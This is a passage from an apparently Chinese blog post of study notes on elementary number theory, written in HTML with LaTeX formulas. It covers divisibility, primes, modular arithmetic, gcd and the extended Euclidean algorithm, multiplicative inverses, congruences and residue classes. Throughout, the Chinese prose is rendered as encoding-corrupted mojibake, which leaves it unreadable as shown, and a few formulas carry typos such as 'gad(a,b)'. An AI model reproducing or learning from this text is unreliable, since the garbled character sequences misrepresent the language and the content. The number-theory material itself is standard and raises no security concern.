æƒ¯å·®å¼‚ï¼Œç¬¦å·å­—æ¯ä¹Ÿæ˜¯markdownå…¬å¼ç¼–è¾‘æ‰‹æ“å‡ºæ¥çš„ï¼Œå‘å¸ƒå‡ºæ¥çš„å…¬å¼æ¸²æŸ“å¯èƒ½ä¼šå‡ºä¸€ç‚¹ç‚¹å°é—®é¢˜ï¼Œå¤§å®¶å¤šåŒ…æ¶µï¼Œ<strong>å¯¹äºæ¸²æŸ“ä¸å‡ºæ¥çš„å…¬å¼ï¼Œå¤§å®¶å¯ä»¥è‡ªå·±å¤åˆ¶åˆ°typoraé‡Œçœ‹</strong>ğŸ˜€ã€‚</p><p>PS2ï¼šç¼–è¾‘å™¨å’Œæˆ‘ä¸ªäººæ°´å¹³å·®çš„ç¼˜æ•…ï¼Œå¯èƒ½æ’ç‰ˆã€å†…å®¹é¡ºåºæ‚ä¹±ï¼Œå¤§å®¶è½»ç‚¹å–·</p><p>PS3ï¼šæœ‰ä¿®æ”¹å»ºè®®çš„è¯å¯ä»¥å‘é‚®ä»¶æemail: <strong>Cucumber0703@outlook.com</strong> ,çœ‹åˆ°åä¼šå…‰é€Ÿæ»‘è½¨ä¿®æ”¹çš„</p></blockquote><hr><h1 id="åˆç­‰æ•°è®º"><a href="#åˆç­‰æ•°è®º" class="headerlink" title="åˆç­‰æ•°è®º"></a>åˆç­‰æ•°è®º</h1><hr><h2 id="æ•´é™¤æ€§ï¼ˆDivisibilityï¼‰"><a href="#æ•´é™¤æ€§ï¼ˆDivisibilityï¼‰" class="headerlink" title="æ•´é™¤æ€§ï¼ˆDivisibilityï¼‰"></a>æ•´é™¤æ€§ï¼ˆDivisibilityï¼‰</h2><script type="math/tex; mode=display">\begin{flalign*}b|a:&è®¾a,bâˆˆ\mathbb{Z}ï¼Œå¦‚æœå­˜åœ¨ä¸€ä¸ªqâˆˆ\mathbb{Z}\\&ä½¿å¾—a=qbï¼Œåˆ™ç§°â€œbæ•´é™¤aâ€ï¼Œè®°ä¸ºâ€œ\ b|a\ "\\&(æˆ–ç§°ï¼šbæ˜¯açš„å› å­ï¼Œaæ˜¯bçš„å€æ•°ï¼Œaè¢«bæ•´é™¤)\\&&\end{flalign*}\\</script><script type="math/tex; mode=display">\begin{flalign*}b\nmid aï¼š&bä¸èƒ½æ•´é™¤a(aä¸èƒ½è¢«bæ•´é™¤\\&b|a \iff a=qb\\&&\end{flalign*}\\</script><script type="math/tex; mode=display">\begin{flalign*}&å¯¹äºä»»æ„a,b,câˆˆ\mathbb{Z}ï¼Œæœ‰ï¼š\\&(1)b|0\\&(2)1|a\\&(3)0|a\iff a=0 (éƒ¨åˆ†æ•™æè¯´æ˜bå¯ä¸º0ï¼Œç”±äºåœ¨å®šä¹‰ä¸­ä¸ºä¹˜æ³•å…³ç³»a=qbï¼Œæ•…è™½ç„¶aè¢«bæ•´é™¤ï¼Œbä¾æ—§å¯ä¸º0)\\&(4)b|a\iff b|-a \iff -b|a\\&(5)b|aä¸”a|bå½“ä¸”ä»…å½“a=Â±bï¼Œç‰¹åˆ«åœ°ï¼Œa|1å½“ä¸”ä»…å½“a=Â±1\\&&\end{flalign*}\\</script><ul><li>(è‡ªåæ€§)  $a|a$</li><li>(ä¼ é€’æ€§)  $b|aä¸”a|c,åˆ™b|c$</li><li>(ç›¸ä¹˜æ€§)  $b|aï¼Œåˆ™bc|ac$</li><li>(æ¶ˆå»æ€§)  $bc|acä¸”câ‰ 0ï¼Œåˆ™b|a$</li><li>(çº¿æ€§æ€§)  $b|aä¸”b|cï¼Œå¯¹äºæ‰€æœ‰s,tâˆˆ\mathbb{Z},éƒ½æœ‰b|(saÂ±tc)$</li><li>(æ¯”è¾ƒæ€§)  $å¦‚æœa,bâˆˆ\mathbb{N}ä¸”b|aï¼Œåˆ™bâ‰¤a$</li></ul><blockquote><p>ç»ƒä¹ é¢˜1ï¼š</p><p>è¯æ˜å¯¹äºä»»ä½•è‡ªç„¶æ•°ï¼Œè®©å…¶å„ä½ä¸Šçš„æ•°å­—ç›¸åŠ ä¹‹å’Œå¦‚æœèƒ½è¢«3æ•´é™¤ï¼Œé‚£ä¹ˆè¿™ä¸ªè‡ªç„¶æ•°ä¹Ÿå¯ä»¥è¢«3æ•´é™¤</p></blockquote><hr><h2 id="ç´ æ•°ï¼ˆPrimeï¼‰"><a href="#ç´ æ•°ï¼ˆPrimeï¼‰" class="headerlink" title="ç´ æ•°ï¼ˆPrimeï¼‰"></a>ç´ æ•°ï¼ˆPrimeï¼‰</h2><ul><li><p>å®šä¹‰ï¼š$è®¾nâˆˆ\mathbb{N}ä¸”nâ‰¥2ï¼Œé™¤äº†1å’Œnä»¥å¤–ï¼Œæ²¡æœ‰å…¶ä»–æ­£æ•´æ•°æ•´é™¤nï¼Œnç§°ä½œâ€œç´ æ•°â€(é€šå¸¸ç”¨pè¡¨ç¤º)ï¼›å¦åˆ™ï¼Œnç§°ä½œâ€œåˆæ•°â€$</p><blockquote><p>PSï¼š$1æ—¢ä¸æ˜¯ç´ æ•°ä¹Ÿä¸æ˜¯åˆæ•°$</p><p>PSï¼š$nä¸ºåˆæ•°ï¼Œåˆ™n=abï¼Œå…¶ä¸­1&lt;a&lt;nï¼Œ1&lt;b&lt;n$</p></blockquote></li></ul><h3 id="å¼•ç†ï¼šä»»ä½•å¤§äº1çš„æ•´æ•°å¿…æœ‰ç´ å› å­ã€‚"><a href="#å¼•ç†ï¼šä»»ä½•å¤§äº1çš„æ•´æ•°å¿…æœ‰ç´ å› å­ã€‚" class="headerlink" title="å¼•ç†ï¼šä»»ä½•å¤§äº1çš„æ•´æ•°å¿…æœ‰ç´ å› å­ã€‚"></a><strong>å¼•ç†ï¼šä»»ä½•å¤§äº1çš„æ•´æ•°å¿…æœ‰ç´ å› å­ã€‚</strong></h3><h3 id="å®šç†ï¼šä»»ä½•åˆæ•°néƒ½è‡³å°‘æœ‰ä¸€ä¸ªä¸è¶…è¿‡-sqrt-n-çš„ç´ å› å­ï¼ˆn-gt-1æ˜¯åˆæ•°ï¼Œåˆ™å­˜åœ¨ç´ æ•°pï¼Œä½¿pâ‰¤-sqrt-n-ï¼‰"><a href="#å®šç†ï¼šä»»ä½•åˆæ•°néƒ½è‡³å°‘æœ‰ä¸€ä¸ªä¸è¶…è¿‡-sqrt-n-çš„ç´ å› å­ï¼ˆn-gt-1æ˜¯åˆæ•°ï¼Œåˆ™å­˜åœ¨ç´ æ•°pï¼Œä½¿pâ‰¤-sqrt-n-ï¼‰" class="headerlink" title="å®šç†ï¼šä»»ä½•åˆæ•°néƒ½è‡³å°‘æœ‰ä¸€ä¸ªä¸è¶…è¿‡$\sqrt{n}$çš„ç´ å› å­ï¼ˆn&gt;1æ˜¯åˆæ•°ï¼Œåˆ™å­˜åœ¨ç´ æ•°pï¼Œä½¿pâ‰¤$\sqrt{n}$ï¼‰"></a><strong>å®šç†ï¼šä»»ä½•åˆæ•°néƒ½è‡³å°‘æœ‰ä¸€ä¸ªä¸è¶…è¿‡$\sqrt{n}$çš„ç´ å› å­ï¼ˆn&gt;1æ˜¯åˆæ•°ï¼Œåˆ™å­˜åœ¨ç´ æ•°pï¼Œä½¿pâ‰¤$\sqrt{n}$ï¼‰</strong></h3><ul><li><strong>åˆ¤æ–­næ˜¯å¦æ˜¯ç´ æ•°ï¼Œå¦‚æœæ‰€æœ‰ç´ æ•°pâ‰¤$\sqrt{n}$éƒ½ä¸èƒ½æ•´é™¤nï¼Œåˆ™næ˜¯ç´ æ•°</strong></li></ul><h3 id="å®šç†ï¼šç®—æ•°åŸºæœ¬å®šç†ï¼šä»»ä½•éé›¶æ•´æ•°nï¼Œå¯ä»¥è¡¨ç¤ºæˆå¦‚ä¸‹çš„ä¹˜ç§¯å½¢å¼ï¼š"><a href="#å®šç†ï¼šç®—æ•°åŸºæœ¬å®šç†ï¼šä»»ä½•éé›¶æ•´æ•°nï¼Œå¯ä»¥è¡¨ç¤ºæˆå¦‚ä¸‹çš„ä¹˜ç§¯å½¢å¼ï¼š" class="headerlink" title="å®šç†ï¼šç®—æ•°åŸºæœ¬å®šç†ï¼šä»»ä½•éé›¶æ•´æ•°nï¼Œå¯ä»¥è¡¨ç¤ºæˆå¦‚ä¸‹çš„ä¹˜ç§¯å½¢å¼ï¼š"></a><strong>å®šç†ï¼šç®—æ•°åŸºæœ¬å®šç†</strong>ï¼šä»»ä½•éé›¶æ•´æ•°nï¼Œå¯ä»¥è¡¨ç¤ºæˆå¦‚ä¸‹çš„ä¹˜ç§¯å½¢å¼ï¼š</h3><script type="math/tex; mode=display">n=\pm p_1^{e_1}\dots p_r^{e_r}</script><p>â€‹        å…¶ä¸­ï¼Œ$p_1,\dots ,p_ræ˜¯äº’ä¸ç›¸åŒçš„ç´ æ•°ï¼Œe_1,\dotsï¼Œe_ræ˜¯æ­£æ•´æ•°$ã€‚</p><ul><li>PSï¼šè¿™ä¸ªè¡¨ç¤ºå½¢å¼å”¯ä¸€ï¼ˆå¿½ç•¥é¡ºåºï¼‰ï¼Œè®¤ä¸º$\pm1$å¯ä»¥è¡¨ç¤ºæˆ0ä¸ªç´ å› å­é¡¹ç›¸ä¹˜ï¼ˆr=0ï¼‰ï¼Œé€šå¸¸æŠŠ0ä¸ªç´ æ•°ç›¸ä¹˜çš„ç»“æœä½œä¸º1ã€‚</li></ul><h3 id="å®šç†ï¼š-è®¾pæ˜¯ç´ æ•°ï¼Œa-bâˆˆ-mathbb-Z-åˆ™p-mid-ab-Rightarrow-p-mid-aæˆ–p-mid-b"><a href="#å®šç†ï¼š-è®¾pæ˜¯ç´ æ•°ï¼Œa-bâˆˆ-mathbb-Z-åˆ™p-mid-ab-Rightarrow-p-mid-aæˆ–p-mid-b" class="headerlink" title="å®šç†ï¼š$è®¾pæ˜¯ç´ æ•°ï¼Œa,bâˆˆ\mathbb{Z},åˆ™p\mid ab \Rightarrow p\mid aæˆ–p\mid b$"></a>å®šç†ï¼š$è®¾pæ˜¯ç´ æ•°ï¼Œa,bâˆˆ\mathbb{Z},åˆ™p\mid ab \Rightarrow p\mid aæˆ–p\mid b$</h3><blockquote><p>æ¨è®ºï¼š$è®¾pæ˜¯a_1,\dots ,a_k\in \mathbb{Z},åˆ™p\in a_1\dots a_k \Rightarrow p \in a_i,i \in \{1,\dots,k\}$</p></blockquote><h3 id="å®šç†ï¼šæ¬§å‡ é‡Œå¾—å®šç†ï¼šç´ æ•°æœ‰æ— ç©·æˆ–å¤šä¸ª"><a href="#å®šç†ï¼šæ¬§å‡ é‡Œå¾—å®šç†ï¼šç´ æ•°æœ‰æ— ç©·æˆ–å¤šä¸ª" class="headerlink" title="å®šç†ï¼šæ¬§å‡ é‡Œå¾—å®šç†ï¼šç´ æ•°æœ‰æ— ç©·æˆ–å¤šä¸ª"></a><strong>å®šç†ï¼šæ¬§å‡ é‡Œå¾—å®šç†ï¼šç´ æ•°æœ‰æ— ç©·æˆ–å¤šä¸ª</strong></h3><p>â€‹        è¯æ˜ç•¥</p><hr><h2 id="æ¨¡è¿ç®—"><a href="#æ¨¡è¿ç®—" class="headerlink" title="æ¨¡è¿ç®—"></a>æ¨¡è¿ç®—</h2><script type="math/tex; mode=display">a\ mod\ bï¼šè®¾aï¼Œbâˆˆ \mathbb{Z}ä¸”b>0,å¦‚æœq,râˆˆ\mathbb{Z}æ»¡è¶³\\a=qb+r,ä¸”0\leq r<b,\\åˆ™å®šä¹‰ï¼ša\ mod\ b=r</script><p>è´Ÿæ•°æ€ä¹ˆæ±‚æ¨¡ï¼Ÿ</p><blockquote><p> ç”¨bä¸æ–­åŠ aï¼Œç›´è‡³å¤§äº0</p></blockquote><p>æ€§è´¨ï¼š</p><ul><li>$b|a \iff a\ mod\ b=0$</li><li>$(a+b)\ mod\ n=(a\ mod\ n+b\ mod n)\ mod\ n$</li><li>$(a-b)\ mod\ n=(a\ mod\ n-b\ mod n)\ mod\ n$</li><li>$(a\times b)\ mod\ n=(a\ mod\ n\times b\ mod n)\ mod\ n$</li></ul><h3 id="ä¹˜æ³•é€†å…ƒï¼ˆä¸€å®šè¦è¯´æ˜æ˜¯åœ¨å“ªä¸ªæ¨¡æ•°ä¸‹çš„ä¹˜æ³•é€†å…ƒï¼‰"><a href="#ä¹˜æ³•é€†å…ƒï¼ˆä¸€å®šè¦è¯´æ˜æ˜¯åœ¨å“ªä¸ªæ¨¡æ•°ä¸‹çš„ä¹˜æ³•é€†å…ƒï¼‰" class="headerlink" title="ä¹˜æ³•é€†å…ƒï¼ˆä¸€å®šè¦è¯´æ˜æ˜¯åœ¨å“ªä¸ªæ¨¡æ•°ä¸‹çš„ä¹˜æ³•é€†å…ƒï¼‰"></a>ä¹˜æ³•é€†å…ƒï¼ˆä¸€å®šè¦è¯´æ˜æ˜¯åœ¨å“ªä¸ªæ¨¡æ•°ä¸‹çš„ä¹˜æ³•é€†å…ƒï¼‰</h3><blockquote><p>ä¹å¹´åˆ¶ä¹‰åŠ¡æ•™è‚²ä¸­çš„æ¦‚å¿µï¼šå€’æ•°ï¼šä¸¤ä¸ªæ•°çš„ä¹˜ç§¯ä¸º1ï¼Œå°±ç§°è¿™ä¸¤ä¸ªæ•°äº’ä¸ºå€’æ•°</p></blockquote><p>å®šä¹‰ï¼š$è®¾a\in \mathbb{Z},n\in \mathbb{N},å¦‚æœ az \equiv1 \pmod n,$<br>$ç§°zæ˜¯æ¨¡nä¸‹açš„ä¹˜æ³•é€†å…ƒï¼Œè®°ä½œa^{-1}=zã€‚$</p><blockquote><p>ä¾‹ï¼š</p><p>$2^{-1}\ mod\ 7=4$</p><p>$2^{-1}\ mod\ 5=3$</p></blockquote><ul><li><p>æ³¨æ„1ï¼š$æ¨¡nä¸‹äº’ä¸ºä¹˜æ³•é€†å…ƒï¼Œä¸€èˆ¬åªè€ƒè™‘æ¯”nå°çš„$</p></li><li><p>æ³¨æ„2ï¼š$aåœ¨æ¨¡nå†…çš„ä¹˜æ³•é€†å…ƒa^{-1}(1\le a^{-1} \lt n)æ˜¯å”¯ä¸€çš„$</p></li><li><p>æ³¨æ„3ï¼šä¹˜æ³•é€†å…ƒå­˜åœ¨çš„æ¡ä»¶ï¼š</p><p>$gcd(a,n)=1\iff æ¨¡nä¸‹ï¼Œaæœ‰ä¹˜æ³•é€†å…ƒ$</p></li></ul><p>æ€ä¹ˆæ±‚ä¹˜æ³•é€†å…ƒï¼Œè§ä¸‹é¢â€”â€”<strong>æ‰©å±•çš„æ¬§å‡ é‡Œå¾—ç®—æ³•</strong></p><hr><h2 id="æœ€å¤§å…¬çº¦æ•°"><a href="#æœ€å¤§å…¬çº¦æ•°" class="headerlink" title="æœ€å¤§å…¬çº¦æ•°"></a>æœ€å¤§å…¬çº¦æ•°</h2><ul><li>$è®¾a,bâˆˆ\mathbb{Z},å¦‚æœdâˆˆ\mathbb{Z}ä¸”d|aï¼Œd|bï¼Œåˆ™ç§°dæ˜¯aå’Œbçš„å…¬å› å­(å…¬çº¦æ•°)$</li><li>$å¦‚æœdâ‰¥0ï¼Œä¸”aå’Œbçš„æ‰€æœ‰å…¬å› å­éƒ½æ•´é™¤dï¼Œåˆ™ç§°dæ˜¯aå’Œbçš„æœ€å¤§å…¬çº¦æ•°ï¼Œè®°ä½œgcd(a,b).$</li></ul><blockquote><p>PS:å…¬å› å­å¯ä»¥æ˜¯ä»»æ„æ•´æ•°ï¼ˆåŒ…æ‹¬0ï¼Œè´Ÿæ•´æ•°ï¼‰</p><p>PS:æœ€å¤§å…¬çº¦æ•°åªèƒ½æ˜¯0æˆ–æ­£æ•´æ•°ï¼Œä¸èƒ½æ˜¯è´Ÿçš„</p></blockquote><h3 id="æ¬§å‡ é‡Œå¾—ç®—æ³•-è¾—è½¬ç›¸é™¤æ³•"><a href="#æ¬§å‡ é‡Œå¾—ç®—æ³•-è¾—è½¬ç›¸é™¤æ³•" class="headerlink" title="æ¬§å‡ é‡Œå¾—ç®—æ³• (è¾—è½¬ç›¸é™¤æ³•)"></a>æ¬§å‡ é‡Œå¾—ç®—æ³• (è¾—è½¬ç›¸é™¤æ³•)</h3><p> ä¸å¤±ä¸€èˆ¬æ€§ï¼Œè®¾aâ‰¥bâ‰¥0ï¼Œæ±‚gcd(a,b)</p><p>æ•°å­¦åŸç†ï¼š</p><p>$b=0æ—¶ï¼Œgcd(a,0)=a$ï¼ˆä»»ä½•æ•´æ•°éƒ½æ˜¯0çš„å…¬å› å­ï¼‰</p><script type="math/tex; mode=display">b>0æ—¶ï¼Œgcd(a,b)=gcd(b,r)=gcd(r,r_1)\\=gcd(r_n,0)=r_n</script><blockquote><p>PSï¼šrä¸ºä½™æ•°ï¼Œa=qb+r</p></blockquote><h3 id="æ‰©å±•çš„æ¬§å‡ é‡Œå¾—ç®—æ³•-å¹¿ä¹‰æ¬§å‡ é‡Œå¾—ç®—æ³•"><a href="#æ‰©å±•çš„æ¬§å‡ é‡Œå¾—ç®—æ³•-å¹¿ä¹‰æ¬§å‡ é‡Œå¾—ç®—æ³•" class="headerlink" title="æ‰©å±•çš„æ¬§å‡ é‡Œå¾—ç®—æ³•(å¹¿ä¹‰æ¬§å‡ é‡Œå¾—ç®—æ³•)"></a>æ‰©å±•çš„æ¬§å‡ é‡Œå¾—ç®—æ³•(å¹¿ä¹‰æ¬§å‡ é‡Œå¾—ç®—æ³•)</h3><p>ç”¨é€”ï¼š$è®¡ç®—as+bt=gcd(a,b)ä¸­çš„så’Œt$</p><p>æœ¬è´¨æ˜¯åœ¨æ‰§è¡Œæ¬§å‡ é‡Œå¾—ç®—æ³•çš„æ—¶å€™åˆ©ç”¨æ¯ä¸€æ­¥è®¡ç®—å‡ºæ¥çš„ä½™æ•°ä»¥åŠå‰¯äº§å“â€œå•†â€ï¼Œé¡ºé“è¿­ä»£çš„è®¡ç®—å‡ºæ¯ä¸€æ­¥å¯¹åº”çš„så’Œt</p><p><img src="/2024/07/30/%E7%AD%91%E5%9F%BA%E7%AF%87%C2%B7%E5%88%9D%E7%AD%89%E6%95%B0%E8%AE%BA/exgcd.jpg" alt="exgcd"></p><h3 id="è£´èœ€å®šç†"><a href="#è£´èœ€å®šç†" class="headerlink" title="è£´èœ€å®šç†"></a>è£´èœ€å®šç†</h3><p>$è‹¥a,bæ˜¯æ•´æ•°,ä¸”    gcd    (a,b)=dï¼Œé‚£ä¹ˆå¯¹äºä»»æ„çš„æ•´æ•°x,y,ax+byéƒ½ä¸€å®šæ˜¯dçš„å€æ•°ï¼Œç‰¹åˆ«åœ°ï¼Œä¸€å®šå­˜åœ¨æ•´æ•°x,yï¼Œä½¿ax+by=dæˆç«‹$</p><p>æ³¨æ„ï¼šæ­¤å¤„çš„xå’Œyæ˜¯æ•´æ•°ï¼ˆå³å¯ä»¥æ˜¯è´Ÿæ•°ï¼‰</p><h3 id="å®šç†ï¼šæœ€å¤§å…¬çº¦æ•°è¡¨ç¤ºå®šç†"><a href="#å®šç†ï¼šæœ€å¤§å…¬çº¦æ•°è¡¨ç¤ºå®šç†" class="headerlink" title="å®šç†ï¼šæœ€å¤§å…¬çº¦æ•°è¡¨ç¤ºå®šç†"></a>å®šç†ï¼šæœ€å¤§å…¬çº¦æ•°è¡¨ç¤ºå®šç†</h3><p>$è®¾a,bâˆˆ\mathbb{Z},d=gcd(a,b),åˆ™\exists s,tâˆˆ\mathbb{Z},ä½¿å¾—as+bt=d$</p><p>ç‰¹åˆ«åœ°ï¼š$gcd(a,b)=1\iff as+bt=1$</p><p>æ¨è®ºï¼š$d\mid v\iff as+bt=v$</p><h3 id="æ±‚ä¹˜æ³•é€†å…ƒ"><a href="#æ±‚ä¹˜æ³•é€†å…ƒ" class="headerlink" title="æ±‚ä¹˜æ³•é€†å…ƒ"></a>æ±‚ä¹˜æ³•é€†å…ƒ</h3><p>$è®¾gcd(a,n)=1$</p><p>$æ ¹æ®æœ€å¤§å…¬çº¦æ•°è¡¨ç¤ºå®šç†ï¼Œæœ‰$</p><p>$as+tn=1$</p><p>$ç­‰å¼ä¸¤è¾¹åŒæ—¶æ¨¡nï¼Œå¾—$</p><p>$as\equiv1\pmod n$</p><p>$æ˜“çŸ¥ï¼Œæ¨¡nä¸‹açš„é€†å…ƒæ˜¯s$</p><hr><h2 id="äº’ç´ "><a href="#äº’ç´ " class="headerlink" title="äº’ç´ "></a>äº’ç´ </h2><ul><li><p>$è®¾a,bâˆˆ\mathbb{Z},å¦‚æœgcd(a,b)=1,åˆ™ç§°aå’Œbäº’ç´ ã€‚$</p></li><li><p>$è®¾gcd(a,b)=d,åˆ™å­˜åœ¨q_1,q_2\in \mathbb{Z},ä½¿å¾—a=q_1 d,b=q_2d,ä¸”gcd(q_1,q_2)=1$</p></li></ul><hr><h2 id="æœ€å°å…¬å€æ•°-LCM"><a href="#æœ€å°å…¬å€æ•°-LCM" class="headerlink" title="æœ€å°å…¬å€æ•°(LCM)"></a>æœ€å°å…¬å€æ•°(LCM)</h2><ul><li><p>$è®¾a,bâˆˆ\mathbb{Z},å¦‚æœmâˆˆ\mathbb{Z}åˆ†åˆ«æ˜¯aå’Œbçš„å€æ•°ï¼Œmç§°ä½œaå’Œbçš„å…¬å€æ•°$</p><blockquote><p>$å¦‚æœa\mid c,b\mid c,åˆ™m\mid c$</p></blockquote></li><li><p>$lcm(a,b):aå’Œbçš„æœ€å°å…¬å€æ•°$</p></li><li>$a,bâ‰ 0ï¼šmæ˜¯aå’Œbæ‰€æœ‰æ­£çš„å…¬å€æ•°ä¸­æœ€å°ï¼Œmå«ä½œaå’Œbçš„æœ€å°å…¬å€æ•°$</li><li>$a=0æˆ–b=0ï¼šlcm(a,b)=0$</li><li><p>$gad(a,b)=1\Rightarrow lcm(a,b)=ab$</p></li><li><p>$lcm(a,b)=ab/gcd(a,b)$</p><blockquote><p>æ±‚lcmï¼šä¸¤ä¸ªæ•°ä¸æ–­åŠ è‡ªå·±ï¼Œç›´è‡³ç›¸ç­‰ã€‚</p></blockquote></li></ul><hr><h2 id="ç­‰ä»·å…³ç³»"><a href="#ç­‰ä»·å…³ç³»" class="headerlink" title="ç­‰ä»·å…³ç³»"></a>ç­‰ä»·å…³ç³»</h2><p>åŒæ—¶æ»¡è¶³<strong>è‡ªåæ€§ï¼Œå¯¹ç§°æ€§ï¼Œä¼ é€’æ€§</strong></p><blockquote><p>ä¾‹ï¼š&gt;åªæ»¡è¶³ä¼ é€’æ€§ï¼Œâ‰¥ä¸æ»¡è¶³å¯¹ç§°</p></blockquote><h2 id="åŒä½™å…³ç³»"><a href="#åŒä½™å…³ç³»" class="headerlink" title="åŒä½™å…³ç³»"></a>åŒä½™å…³ç³»</h2><p>$a\equiv b \pmod n$ï¼šè®¾nä¸ºæ­£æ•´æ•°(æ­¤å¤„è¢«ç§°ä¸ºæ¨¡æ•°)ï¼Œæ•´æ•°aå’Œbåˆ†åˆ«æ¨¡nï¼Œå¦‚æœå¾—åˆ°ç›¸åŒçš„ä½™æ•°ï¼Œå°±ç§°aå’Œbåœ¨æ¨¡nä¸‹æ»¡è¶³åŒä½™å…³ç³»ï¼Œç®€ç§°åŒä½™ï¼ˆæ­¤å¤„ä¸ºå…³ç³»ï¼Œè€Œéè¿ç®—ï¼Œä¸$a\  mod \ b$è¿›è¡ŒåŒºåˆ†ï¼‰</p><p>å®šä¹‰ï¼š$è®¾a,b,nâˆˆ\mathbb{Z},n\mid (a-b),å°±ç§°aå’Œbåœ¨æ¨¡nä¸‹åŒä½™ï¼Œè®°ä½œa\equiv b\pmod nã€‚$</p><p>æ˜¯ä¸€ç§<strong>ç­‰ä»·å…³ç³»</strong></p><p>è¿ç®—æ€§è´¨ï¼šåŠ å‡ä¹˜(ç”šè‡³æ˜¯å’Œä¹˜æ–¹)ä»ç„¶æ»¡è¶³åŒä½™å…³ç³»ï¼Œé™¤æ³•æœ‰éœ€è¦ç‰¹åˆ«æ³¨æ„çš„åœ°æ–¹ã€‚</p><h3 id="ä¸€æ¬¡åŒä½™æ–¹ç¨‹"><a href="#ä¸€æ¬¡åŒä½™æ–¹ç¨‹" class="headerlink" title="ä¸€æ¬¡åŒä½™æ–¹ç¨‹"></a>ä¸€æ¬¡åŒä½™æ–¹ç¨‹</h3><p>$x\equiv b \pmod nçš„è§£é›†ï¼š{b\pm nk,å…¶ä¸­k=0,1,2,3\dots}$</p><ul><li><p>ä¸€ä¸ªè§„å¾‹ï¼š$åŸæ¨¡æ•°ä¸ºn,æœ€ç»ˆæ¨¡æ•°ä¸ºn^{â€™},è®¾n/n{â€™}=dï¼Œæœ‰0\sim n-1ä¹‹é—´è§£çš„æ•°é‡æ°å¥½ç­‰äºd$</p></li><li><p>æœ‰è§£çš„æ¡ä»¶ï¼š$è‹¥gcd(a,n)=d,åˆ™ax\equiv b\pmod næœ‰è§£\iff d\mid b$</p></li></ul><h3 id="æ¶ˆå»å¾‹"><a href="#æ¶ˆå»å¾‹" class="headerlink" title="æ¶ˆå»å¾‹"></a>æ¶ˆå»å¾‹</h3><p>$å®šä¹‰ï¼šè®¾a,n\in \mathbb{Z},n&gt;0,å¦‚æœgcd(a,n)=d,æœ‰$</p><p>$az\equiv az^{â€˜}\pmod n\ \Rightarrow \ z\equiv z^{â€˜}\pmod {n/d}$</p><hr><h2 id="å‰©ä½™ç±»-ä¸€ç§ç­‰ä»·ç±»"><a href="#å‰©ä½™ç±»-ä¸€ç§ç­‰ä»·ç±»" class="headerlink" title="å‰©ä½™ç±»(ä¸€ç§ç­‰ä»·ç±»)"></a>å‰©ä½™ç±»(ä¸€ç§ç­‰ä»·ç±»)</h2><h3 id="ç­‰ä»·ç±»çš„æ¦‚å¿µ"><a href="#ç­‰ä»·ç±»çš„æ¦‚å¿µ" class="headerlink" title="ç­‰ä»·ç±»çš„æ¦‚å¿µ"></a>ç­‰ä»·ç±»çš„æ¦‚å¿µ</h3><p>$è®¾\simæ˜¯é›†åˆSä¸Šçš„ç­‰ä»·å…³ç³»ï¼Œå¯¹äºa\in \mathbb{S},å®šä¹‰å…¶ç­‰ä»·ç±»ä¸º\{x\in \mathbb{S}\ |\ x\sim a\}$</p><ul><li>$\mathbb{S}ä¸­æ¯ä¸ªå…ƒç´ å¿…å­˜åœ¨äºå”¯ä¸€çš„ç­‰ä»·ç±»ä¸­$</li><li>$æ‰€æœ‰ç­‰ä»·ç±»çš„å¹¶é›†æ°å¥½å°±æ˜¯\mathbb{S}$</li></ul><h3 id="å‰©ä½™ç±»-æ»¡è¶³ç­‰ä»·ç±»æ‰€æœ‰æ€§è´¨"><a href="#å‰©ä½™ç±»-æ»¡è¶³ç­‰ä»·ç±»æ‰€æœ‰æ€§è´¨" class="headerlink" title="å‰©ä½™ç±»(æ»¡è¶³ç­‰ä»·ç±»æ‰€æœ‰æ€§è´¨)"></a>å‰©ä½™ç±»(æ»¡è¶³ç­‰ä»·ç±»æ‰€æœ‰æ€§è´¨)</h3><p>$è®¾a\in \mathbb{Z}ï¼Œå®šä¹‰å…¶å‰©ä½™ç±»ä¸º\{x\in \mathbb{Z}\ |\ x\equiv a\pmod n \ \}$</p><p>$æ¨¡nä¸‹å«æ•´æ•°açš„å‰©ä½™ç±»ï¼Œè®°ä½œ[a]_n,ä¸å¼•èµ·æ­§ä¹‰æ—¶ï¼Œç®€è®°ä¸º[a]$</p><p>$å‰©ä½™ç±»é‡Œçš„æ¯ä¸ªæ•´æ•°éƒ½å«ä½œè¿™ä¸ªå‰©ä½™ç±»çš„ä»£è¡¨å…ƒï¼Œæ¯”å¦‚æ¨¡5ä¸‹,-10,-5,0,5,10éƒ½æ˜¯[0]çš„ä»£è¡¨å…ƒ$</p><h3 id="å‰©ä½™ç±»é›†ï¼š-mathbb-Z-n"><a href="#å‰©ä½™ç±»é›†ï¼š-mathbb-Z-n" class="headerlink" title="å‰©ä½™ç±»é›†ï¼š$\mathbb{Z_n}$"></a>å‰©ä½™ç±»é›†ï¼š$\mathbb{Z_n}$</h3><p>$\mathbb{Z_n}=\{[0],[1],[2]\dots\,[n-1]\}$</p><p>$\mathbb{Z_5}=\{[0],[1],[2],[3],[4],\}$</p><h4 id="è¿ç®—"><a href="#è¿ç®—" class="headerlink" title="è¿ç®—"></a>è¿ç®—</h4><p>$[a]+[b]:=[a+b]$</p><p>$[a]Â·[b]:=[aÂ·b]$</p><p>$å…¶ä¸­a,b\in \mathbb{Z}$</p><p>$è®¾u,v\in \mathbb{Z_n},è‹¥uv=[1],åˆ™uå’Œväº’ä¸ºä¹˜æ³•é€†å…ƒ$</p><p>$è®¾u=[a],v=[b],åˆ™$</p><p>â€‹    $uå’Œväº’ä¸ºä¹˜æ³•é€†å…ƒ\iff ab \equiv1 \pmod n$</p><p>â€‹    $å³u(å’Œv)æœ‰ä¹˜æ³•é€†å…ƒ\iff a(å’Œb)ä¸näº’ç´ $</p><p>$\mathbb{Z^{*}_n}=\{\mathbb{Z_n}ä¸­æœ‰ä¹˜æ³•é€†å…ƒçš„å‰©ä½™ç±»\}$</p><p>â€‹       $=\{[a]\ |\ a=0,1,\dots,n-1,gcd(a,n)=1\}$</p><ul><li><p>$nä¸ºç´ æ•°ï¼š\mathbb{Z^{*}_n}=\mathbb{Z_n} \setminus \{[0]\}$</p></li><li><p>$nä¸ºåˆæ•°ï¼š\mathbb{Z^{*}_n} \subsetneq \mathbb{Z_n}\setminus\{[0]\}$</p></li></ul><p><strong>ä¸å¼•èµ·èµ·ä¹‰çš„æƒ…å†µä¸‹ï¼Œ[ ]å¯ä»¥çœç•¥</strong></p><hr><h2 id="ä¸­å›½å‰©ä½™å®šç†-å­™å­å®šç†"><a href="#ä¸­å›½å‰©ä½™å®šç†-å­™å­å®šç†" class="headerlink" 